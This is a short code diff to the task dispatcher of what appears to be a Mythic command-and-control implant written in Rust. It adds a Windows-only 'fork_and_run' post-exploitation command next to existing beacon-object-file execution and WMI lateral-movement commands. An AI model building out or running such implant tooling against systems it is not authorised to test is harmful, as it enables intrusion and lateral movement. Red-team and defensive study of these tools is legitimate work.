@@ -106,6 +106,10 @@ impl Tasker {
                     "bof" => self.spawn_bg(task, execute::bof, false)?,
                     #[cfg(not(target_os = "windows"))]
                     "bof" => self.completed_tasks.push(mythic_error!(task.id, "bof is only supported on Windows".to_string())),
+                    #[cfg(target_os = "windows")]
+                    "fork_and_run" => self.spawn_bg(task, execute::fork_and_run, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "fork_and_run" => self.completed_tasks.push(mythic_error!(task.id, "fork_and_run requires Windows".to_string())),
 
                     // --- Lateral movement commands ---
                     "wmi_exec" => self.spawn_bg(task, lateral::wmi_exec, false)?,
